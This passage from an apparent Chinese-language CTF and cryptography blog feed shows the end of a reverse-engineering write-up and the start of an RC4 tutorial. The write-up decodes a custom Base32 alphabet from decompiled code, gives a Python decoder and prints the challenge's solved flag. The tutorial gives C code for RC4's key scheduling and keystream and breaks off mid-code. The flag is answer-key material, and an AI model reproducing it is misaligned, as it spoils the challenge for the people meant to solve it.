class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BYTE *__fastcall <span class="title">sub_401070</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  __int64 v10; <span class="comment">// kr10_8</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  __int64 v12; <span class="comment">// kr18_8</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  __int64 v14; <span class="comment">// kr20_8</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// eax</span></span><br><span class="line">  __int64 v16; <span class="comment">// kr28_8</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// eax</span></span><br><span class="line">  __int64 v18; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v19; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v20; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v21; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  _BYTE *v22; <span class="comment">// [esp+28h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v23; <span class="comment">// [esp+2Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v24; <span class="comment">// [esp+30h] [ebp-18h]</span></span><br><span class="line">  _BYTE *v26; <span class="comment">// [esp+34h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  v2 = a1;</span><br><span class="line">  sub_401000();</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(_BYTE *)(v6 + v2) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++v6;</span><br><span class="line">      v5 += <span class="number">8</span>;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v6 &lt; a2 );</span><br><span class="line">    v23 = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">switch</span> ( v5 % <span class="number">0x28</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8u</span>:</span><br><span class="line">      v4 = <span class="number">6</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x10</span>u:</span><br><span class="line">      v4 = <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x18</span>u:</span><br><span class="line">      v4 = <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x20</span>u:</span><br><span class="line">      v4 = <span class="number">1</span>;</span><br><span class="line">LABEL_10:</span><br><span class="line">      v21 = v4;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v24 = (<span class="number">8</span> * v3 + <span class="number">4</span>) / <span class="number">5</span>;</span><br><span class="line">  result = <span class="built_in">calloc</span>(__CFADD__(v4 + v24, <span class="number">1</span>) ? <span class="number">-1</span> : v4 + v24 + <span class="number">1</span>, <span class="number">1u</span>);</span><br><span class="line">  v26 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v22 = result;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v9 = *(<span class="keyword">unsigned</span> __int8 *)(v8 + v2);</span><br><span class="line">        ++v8;</span><br><span class="line">        v10 = v9;</span><br><span class="line">        <span class="keyword">if</span> ( v8 &gt;= v3 )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v11 = *(<span class="keyword">unsigned</span> __int8 *)(v8 + v2);</span><br><span class="line">          ++v8;</span><br><span class="line">        &#125;</span><br><span class="line">        v12 = v11;</span><br><span class="line">        <span class="keyword">if</span> ( v8 &gt;= v3 )</span><br><span class="line">        &#123;</span><br><span class="line">          v13 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v13 = *(<span class="keyword">unsigned</span> __int8 *)(v8 + v2);</span><br><span class="line">          ++v8;</span><br><span class="line">        &#125;</span><br><span class="line">        v14 = v13;</span><br><span class="line">        <span class="keyword">if</span> ( v8 &gt;= v3 )</span><br><span class="line">        &#123;</span><br><span class="line">          v15 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v15 = *(<span class="keyword">unsigned</span> __int8 *)(v8 + v2);</span><br><span class="line">          ++v8;</span><br><span class="line">        &#125;</span><br><span class="line">        v16 = v15;</span><br><span class="line">        <span class="keyword">if</span> ( v8 &gt;= v3 )</span><br><span class="line">        &#123;</span><br><span class="line">          v17 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v17 = *(<span class="keyword">unsigned</span> __int8 *)(v8 + v2);</span><br><span class="line">          ++v8;</span><br><span class="line">        &#125;</span><br><span class="line">        v18 = v17;</span><br><span class="line">        HIDWORD(v19) = HIDWORD(v14);</span><br><span class="line">        LODWORD(v19) = (((v10 &amp; <span class="number">0xFFFFFFF8</span>) &lt;&lt; <span class="number">8</span>) + (v12 &amp; <span class="number">0xFFFFFFC0</span> | ((<span class="keyword">unsigned</span> __int8)(v10 &amp; <span class="number">7</span>) &lt;&lt; <span class="number">8</span>)) + (v12 &amp; <span class="number">0x3E</span>)) &lt;&lt; <span class="number">8</span>;</span><br><span class="line">        v20 = ((v18 &amp; <span class="number">0x1F</span>)</span><br><span class="line">             + __PAIR64__(HIDWORD(v18), v18 &amp; <span class="number">0xFFFFFFE0</span> | ((v16 &amp; <span class="number">3</span>) &lt;&lt; <span class="number">8</span>))</span><br><span class="line">             + ((__PAIR64__(HIDWORD(v16), v16 &amp; <span class="number">0xFFFFFF80</span> | ((v14 &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">8</span>))</span><br><span class="line">               + ((__PAIR64__(</span><br><span class="line">                     (((v10 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>ui64) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">                    + __PAIR64__(HIDWORD(v12), v12 &amp; <span class="number">0xFFFFFFC0</span> | ((v10 &amp; <span class="number">7</span>) &lt;&lt; <span class="number">8</span>))</span><br><span class="line">                    + (v12 &amp; <span class="number">0x3E</span>)) &gt;&gt; <span class="number">24</span>,</span><br><span class="line">                     v14 &amp; <span class="number">0xFFFFFFF0</span> | ((v12 &amp; <span class="number">1</span>) &lt;&lt; <span class="number">8</span>))</span><br><span class="line">                 + v19) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">               + (v16 &amp; <span class="number">0x7C</span>)) &lt;&lt; <span class="number">8</span>)) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">        HIDWORD(v18) = (v18 &amp; <span class="number">0x1F</span>)</span><br><span class="line">                     + (v18 &amp; <span class="number">0xFFFFFFE0</span> | ((v16 &amp; <span class="number">3</span>) &lt;&lt; <span class="number">8</span>))</span><br><span class="line">                     + (((v16 &amp; <span class="number">0xFFFFFF80</span> | ((<span class="keyword">unsigned</span> __int8)(v14 &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">8</span>))</span><br><span class="line">                       + (((v14 &amp; <span class="number">0xFFFFFFF0</span> | ((<span class="keyword">unsigned</span> __int8)(v12 &amp; <span class="number">1</span>) &lt;&lt; <span class="number">8</span>)) + (_DWORD)v19) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">                       + (v16 &amp; <span class="number">0x7C</span>)) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">        *v22 = byte_403020[(<span class="keyword">unsigned</span> __int8)v20 &gt;&gt; <span class="number">3</span>];</span><br><span class="line">        v22[<span class="number">1</span>] = byte_403020[(__PAIR64__(v20, HIDWORD(v18)) &gt;&gt; <span class="number">30</span>) &amp; <span class="number">0x1F</span>];</span><br><span class="line">        v22[<span class="number">2</span>] = byte_403020[(__PAIR64__(v20, HIDWORD(v18)) &gt;&gt; <span class="number">25</span>) &amp; <span class="number">0x1F</span>];</span><br><span class="line">        v22[<span class="number">3</span>] = byte_403020[(__PAIR64__(v20, HIDWORD(v18)) &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0x1F</span>];</span><br><span class="line">        v22[<span class="number">4</span>] = byte_403020[(__PAIR64__(v20, HIDWORD(v18)) &gt;&gt; <span class="number">15</span>) &amp; <span class="number">0x1F</span>];</span><br><span class="line">        v22[<span class="number">5</span>] = byte_403020[(__PAIR64__(v20, HIDWORD(v18)) &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x1F</span>];</span><br><span class="line">        LOBYTE(v19) = __PAIR64__(v20, HIDWORD(v18)) &gt;&gt; <span class="number">5</span>;</span><br><span class="line">        v3 = v23;</span><br><span class="line">        v22[<span class="number">6</span>] = byte_403020[v19 &amp; <span class="number">0x1F</span>];</span><br><span class="line">        LOBYTE(v19) = byte_403020[BYTE4(v18) &amp; <span class="number">0x1F</span>];</span><br><span class="line">        v2 = a1;</span><br><span class="line">        v22[<span class="number">7</span>] = v19;</span><br><span class="line">        v22 += <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v8 &lt; v23 );</span><br><span class="line">      result = v26;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v21 &gt; <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">memset</span>(&amp;result[v24], <span class="number">0x3D</span>u, v21);</span><br><span class="line">    v26[v24 + v21] = <span class="number">0</span>;</span><br><span class="line">    result = v26;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一堆什么,发现</p><p><code>LODWORD(v16) = (((v23 &amp; 0xFFFFFFF8) &lt;&lt; 8) + (v18 &amp; 0xFFFFFFC0 | ((v23 &amp; 7) &lt;&lt; 8)) + (v18 &amp; 0x3E)) &lt;&lt; 8;</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v24[<span class="number">1</span>] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; <span class="number">30</span>) &amp; <span class="number">0x1F</span>];</span><br><span class="line">v24[<span class="number">2</span>] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; <span class="number">25</span>) &amp; <span class="number">0x1F</span>];</span><br><span class="line">v24[<span class="number">3</span>] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0x1F</span>];</span><br><span class="line">v24[<span class="number">4</span>] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; <span class="number">15</span>) &amp; <span class="number">0x1F</span>];</span><br><span class="line">v24[<span class="number">5</span>] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x1F</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>每次取5个比特，分别赋给8个值，每个值5个位 ,这是base32</p><p>aNadtxa66nbbdxa数组是nAdtxA66nbbdxA71tUAE2AOlnnbtrAp1nQzGtAQGtrjC7===</p><p>在sub_401000，点进去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int16 <span class="title">sub_401000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// cl</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; <span class="number">26</span>; i += <span class="number">2</span> )</span><br><span class="line">    byte_403020[i] += <span class="number">32</span>;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = &amp;aMnopqrstuvwxyz[<span class="number">13</span>];</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = byte_40301F[++v1];</span><br><span class="line">    byte_40301F[v1] = *v2;</span><br><span class="line">    *v2-- = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">int</span>)v2 &gt; (<span class="keyword">int</span>)aMnopqrstuvwxyz );</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;aMnopqrstuvwxyz[<span class="number">14</span>], <span class="string">&quot;765321&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">12594</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是重新修改的密码表了，</p><ol><li><p>字母倒序</p></li><li><p>奇数小写偶数大写</p></li><li><p>后面又加入765321<br>所以表的顺序是</p><p>zYxWvUtSrQpOnMlKjIhGfEdCbA765321</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;nAdtxA66nbbdxA71tUAE2AOlnnbtrAp1nQzGtAQGtrjC7===&quot;</span></span><br><span class="line">table = <span class="string">&quot;zYxWvUtSrQpOnMlKjIhGfEdCbA765321&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(x==<span class="string">&#x27;=&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> table.index(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">8</span>):</span><br><span class="line">    p = s[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>]</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> p:</span><br><span class="line">        t = t&lt;&lt;<span class="number">5</span></span><br><span class="line">        t += find(j)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>((t&amp;<span class="number">0xff00000000</span>)&gt;&gt;<span class="number">32</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        t = t&lt;&lt;<span class="number">8</span></span><br></pre></td></tr></table></figure><p>得到</p><p>flag{f1ag_1s_enc0de_bA3e32!}</p><h2 id="魔改Base"><a href="#魔改Base" class="headerlink" title="魔改Base"></a><strong>魔改Base</strong></h2><p>经过上面的分析也就可以知道Base中可变的几个部分</p><blockquote><p>table</p></blockquote><blockquote><p>移位数据变化</p></blockquote><p>从例子可以看出决定了题中Base-N的N是多少的是移位个数和移位距离</p><blockquote><p>组合加密</p></blockquote><p>很多题都会通过组合加密的方式来提升题目难度，Base中应该就是加密密文和table了</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://kabeor.cn/Base-N%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2">大佬写的博客</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RC4</title>
      <link href="/2021/10/23/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/RC4/"/>
      <url>/2021/10/23/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/RC4/</url>
      
        <content type="html"><![CDATA[<h1 id="RC4与逆向分析"><a href="#RC4与逆向分析" class="headerlink" title="RC4与逆向分析"></a>RC4与逆向分析</h1><p>加密过程和解密过程相同，使用同一个密钥就可以在密文和明文之间转化</p><blockquote><p>c=RC4(key,m)<br>m=RC4(key,c)</p></blockquote><p>RC4（Rivest Cipher 4）是一种流加密算法。流加密，是对称加密算法的一种，加密和解密双方使用相同伪随机加密数据流（pseudo-randomstream）作为密钥，明文数据每次与密钥数据流顺次对应加密，得到密文数据流。实践中数据通常是一个位（bit）并用异或（xor）操作加密。</p><p>RC4密钥长度可变。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。</p><p>所谓对称加密是指：采用单钥密码系统的加密方法，同一个密钥可以同时用作信息的加密和解密，这种加密方法称为对称加密，也称为单密钥加密。</p><p>简而言之，假设我们的明文数据是N位，那么得到的密文数据也是N位，由于是xor操作，我们就可以再xor一下将密文还原成明文。</p><p>RC4算法主要有两大部分组成：初始化算法（KSA）和伪随机子密码生成算法（PRGA)</p><h2 id="加密-解密-原理"><a href="#加密-解密-原理" class="headerlink" title="加密(解密)原理"></a>加密(解密)原理</h2><blockquote><p>RC4由伪随机数生成器和异或运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个S盒。S盒用来加密数据，而且在加密过程中S盒会变化。</p></blockquote><p><strong>由于异或运算的对合性，RC4加密解密使用同一套算法。</strong></p><h2 id="C代码表示"><a href="#C代码表示" class="headerlink" title="C代码表示"></a>C代码表示</h2><ol><li>S-Box 也就是所谓的S盒，是一个256长度的char型数组，每个单元都是一个字节，算法运行的任何时候，S都包括0-255的8比特数的排列组合，只不过值的位置发生了变换。</li><li>密钥K char key[256] 密钥的长度keylen与明文长度、密钥流的长度没有必然关系</li><li>临时向量k 长度也为256，每个单元也是一个字节。如果密钥的长度是256字节，就直接把密钥的值赋给k，否则，轮转地将密钥的每个字节赋给k</li></ol><p>RC4 主要包含三个流程</p><ul><li>初始化 S 和 T 数组。</li><li>初始化置换 S。</li><li>生成密钥流。</li></ul><p><strong>&lt;1&gt;.初始化</strong></p><p>三个参数：</p><p>1.256长度的char型数组，定义为: unsigned char sBox[256];</p><p>2.密钥，其内容可以随便定义：char key[256];</p><p>3.密钥的长度，Len = strlen(key);</p><p>初始化长度为256的S盒。第一个for循环将0到255的互不重复的元素装入S盒。第二个for循环根据密钥打乱S盒。</p><p><img src="https://ctf-wiki.org/crypto/streamcipher/special/figure/rc4_s_t.png" alt="初始化s和t"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s,<span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) </span><br><span class="line">&#123;</span><br><span class="line">        s[i]=i; <span class="comment">//v6[i] = i1;</span></span><br><span class="line">        k[i]=key[i%Len];<span class="comment">//v7 = i1++ % len;  *v6 = *(_BYTE *)(v7 + a2);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;<span class="comment">//v3 = ((unsigned __int8)*result + result[v8] + v3) % 256;</span></span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];     <span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>&lt;2&gt;. 加解密</strong></p><p>参数1是上边rc4_init函数中，被搅乱的S-box;</p><p>参数2是需要加密的数据data;</p><p>参数3是data的长度.</p><p>每收到一个字节，就进行while循环。通过一定的算法定位S盒中的一个元素，并与输入字节异或，得到k。循环中还改变了S盒。如果输入的是明文，输出的就是密文；如果输入的是密文，输出的就是明文。</p><p><img src="https://ctf-wiki.org/crypto/streamcipher/special/figure/rc4_s.png" alt="初始化置换S"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s,<span class="keyword">unsigned</span> <span class="keyword">char</span> *Data,<span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,t=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];      <span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k]^=s[t]; <span class="comment">//生成流密钥</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ctf-wiki.org/crypto/streamcipher/special/figure/rc4_key.png" alt="生成流密钥"></p><p>我们一般称前两部分为 KSA ，最后一部分是 PRGA。</p><p><strong>&lt;3&gt;.主函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;, s2[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//S-box</span></span><br><span class="line">    <span class="keyword">char</span> key[<span class="number">256</span>] = &#123; <span class="string">&quot;justfortest&quot;</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> pData[<span class="number">512</span>] = <span class="string">&quot;这是一个用来加密的数据Data&quot;</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len = <span class="built_in">strlen</span>(pData);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n&quot;</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key=%s,length=%d\n\n&quot;</span>, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_init(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)key, <span class="built_in">strlen</span>(key)); <span class="comment">//已经完成了初始化</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;完成对S[i]的初始化，如下：\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, s[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; (i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)           <span class="comment">//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！</span></span><br><span 